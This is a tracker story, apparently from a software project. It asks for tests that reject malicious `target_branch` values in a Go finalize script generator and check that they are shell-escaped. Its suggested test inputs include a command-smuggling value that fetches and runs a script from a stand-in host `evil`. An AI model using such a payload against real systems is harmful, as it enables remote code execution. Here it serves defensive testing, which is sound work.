---
id: gate-tests-finalize-shell-escape
kind: story
stage: implementing
tags: [testing, security, portal]
parent: null
depends_on: [gate-security-finalize-script-shell-escape]
release_binding: v0.1.0
gate_origin: tests
created: 2026-05-18
updated: 2026-05-18
---

# Shell-injection vector in `writeCheckoutStep` has no script-output assertion test

## Priority
Critical

## Spec reference
Item: `gate-security-finalize-script-shell-escape`
Acceptance criterion: reject malformed `target_branch` at
`PatchFinalizeLock` time; shell-escape both `target_branch` and
`base_sha` inside `writeCheckoutStep` / `buildPreserveScript` /
`buildSquashScript`.

## Gap type
missing test for valid partition + boundary.
`lock_patch_test.go:227 TestPatchFinalizeLock_InvalidMode_400` validates
the `mode` enum but no analogue rejects malformed `target_branch`.
`script_test.go:42 TestBuildScript_Goldens` asserts golden output but
never feeds an attacker-controlled `target_branch` with shell metachars.

## Suggested test
```go
// TestPatchFinalizeLock_RejectsMaliciousTargetBranch
//   Inputs: `x";curl evil/i.sh|sh;#`, `-rf`, `foo bar`, `foo\nbar`.
//   Expect 400 with code session.invalid_target_branch (no row mutation).
// TestBuildScript_TargetBranch_ShellEscaped
//   If pre-validation is bypassed (defence-in-depth), ensure the
//   embedded value in the generated script is single-quoted / escaped.
```

## Test location (suggested)
`internal/portal/finalize/lock_patch_test.go` and
`internal/portal/finalize/script_test.go`
